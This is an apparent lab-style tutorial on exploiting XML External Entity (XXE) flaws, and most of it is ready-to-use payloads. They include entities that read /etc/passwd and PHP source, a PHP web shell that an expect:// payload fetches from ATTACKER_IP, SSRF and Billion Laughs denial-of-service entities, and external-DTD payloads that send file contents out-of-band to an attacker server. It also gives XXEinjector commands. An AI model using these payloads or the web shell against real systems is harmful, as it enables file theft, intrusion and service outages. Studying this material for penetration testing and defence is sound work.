XXE (XML External Entity) is a vulnerability that appears when a web application processes **untrusted XML input** without proper validation. XML allows defining entities inside a DTD (Document Type Definition), and if the parser is insecure, an attacker can define malicious entities.

This vulnerability can lead to:

- Disclosure of local files
    
- Server-Side Request Forgery (SSRF)
    
- Denial of Service (DoS)
    
- In some cases, Remote Code Execution (RCE)
    

The root problem is that the XML parser **trusts user-controlled data**.

---

## Identifying XXE

To find XXE, you first need to detect if the application accepts XML input. This is commonly found in forms, APIs, or legacy systems.

A typical request looks like this:

```http
POST /endpoint HTTP/1.1
Content-Type: application/xml

<root>
  <name>test</name>
  <email>test@test.com</email>
</root>
```

Key things to check:

- Request uses XML format
    
- Input values are reflected in the response
    

If any field (like `<email>`) is returned in the response, it becomes a good injection point.

---

## Testing XML Injection

Before exploiting XXE, confirm that XML injection is possible by defining a simple internal entity.

```xml
<!DOCTYPE root [
  <!ENTITY test "XXE_WORKS">
]>
```

Then use it:

```xml
<email>&test;</email>
```

```http
POST /submitDetails.php HTTP/1.1
Host: victim.com
Content-Type: application/xml
Content-Length: 123

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY test "XXE_WORKS">
]>
<email>
  <message>&test;</message>
</email>
```
If the server responds with `XXE_WORKS`, the entity was processed, meaning:

- XML is parsed
    
- Entities are allowed  
    → The application is likely vulnerable to XXE
    

---

## Reading Local Files

Once XXE is confirmed, you can define an **external entity** to read files from the server.

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

Then inject it:

```xml
<email>&xxe;</email>
```

If successful, the server will return the file content in the response. This is the most common XXE exploitation technique.

---

## Reading Source Code (PHP Filter)

Sometimes files cannot be read directly because they break XML parsing (due to special characters).

In PHP environments, you can bypass this using base64 encoding:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

The response will contain base64 data, which you can decode to get the source code. This is very useful for analyzing the application internally.

---

## Remote Code Execution (XXE → RCE)

In rare cases, XXE can lead to command execution, especially in PHP with the `expect` module enabled.

First, create a web shell:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

Then host it:

```bash
python3 -m http.server 80
```

Finally, use XXE to download it:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'http://ATTACKER_IP/shell.php'">
]>
```

Notes:

- `$IFS` replaces spaces to avoid breaking XML
    
- This method depends on server configuration and often fails in modern systems
    

---

## SSRF via XXE

XXE can also be used to make the server send requests internally.

Example:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
```

This allows:

- Access to internal services
    
- Port scanning
    
- Interaction with hidden APIs
    

This is especially useful in restricted environments.

---

## XXE Denial of Service (Billion Laughs)

A classic attack is the “Billion Laughs”, which abuses recursive entities:

```xml
<!DOCTYPE root [
  <!ENTITY a0 "DOS">
  <!ENTITY a1 "&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;">
]>
```

This causes exponential expansion and can crash the server due to memory exhaustion. Modern parsers usually block this.

---

## Advanced Exfiltration (CDATA)

Some files cannot be extracted normally due to XML restrictions. CDATA can be used to wrap raw data.

However, XML does not allow combining internal and external entities directly. To bypass this, use:

- Parameter entities (`%`)
    
- External DTD
    

External DTD example:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Main payload:

```xml
<!DOCTYPE root [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/index.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/xxe.dtd">
  %xxe;
]>
```

Then:

```http
POST /submitDetails.php HTTP/1.1
Host: 10.129.234.170
Content-Length: 329
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.234.170
Referer: http://10.129.234.170/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://10.10.14.80/xxe.dtd">
%xxe;
]>
<root>
<name>test</name>
<tel>111111111</tel>
<email>&joined;</email>
<message>tesst
</message>
</root>
```

This allows extracting complex or binary data safely.

---

## Error-Based XXE

If the application does not return any output, but shows errors, you can exploit that.

External DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Payload:

```xml
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP/xxe.dtd">
  %remote;
  %error;
]>
```

The server will throw an error including the file content. This technique is useful in “blind” scenarios with visible errors.

---

## Blind Data Exfiltration

In some cases, XXE is present but:

- No data is returned in the response
    
- No errors are shown
    

This is called **Blind XXE**.

Even though entities are processed, the attacker cannot see the result directly.


### Out-of-Band (OOB) Data Exfiltration

To bypass this, attackers use **Out-of-Band (OOB) exfiltration**.

Instead of returning data in the response, the server is forced to send it to an external server controlled by the attacker.

**External DTD:**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?data=%file;'>">
```

**Main Payload:**

```http
POST /blind/submitDetails.php HTTP/1.1
Host: victim.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

**Result:**

The server makes a request like:

```
http://ATTACKER_IP:8000/?data=BASE64_DATA
```

The attacker decodes the data to get the file content.

### Automated OOB Exfiltration (XXEinjector)

In blind XXE scenarios, data exfiltration can be automated using tools like **XXEinjector**.

This tool supports:

- Basic XXE
    
- CDATA exfiltration
    
- Error-based XXE
    
- Blind OOB exfiltration
    

### Installation

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

### Prepare Request

Copy a request from Burp and replace the XML body with:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: victim.com
Content-Type: application/xml

<?xml version="1.0"?>
XXEINJECT
```

`XXEINJECT` is used by the tool as an injection point.

### Run the Tool

```bash
ruby XXEinjector.rb \
--host=ATTACKER_IP \
--httpport=8000 \
--file=/tmp/request.req \
--path=/etc/passwd \
--oob=http \
--phpfilter
```


- `--host` → attacker IP
    
- `--httpport` → port for receiving data
    
- `--file` → HTTP request file
    
- `--path` → file to read
    
- `--oob=http` → use OOB via HTTP
    
- `--phpfilter` → encode output in base64
    
The tool does not always print the data directly.

Extracted data is stored in:

```bash
Logs/<target>/etc/passwd.log
```
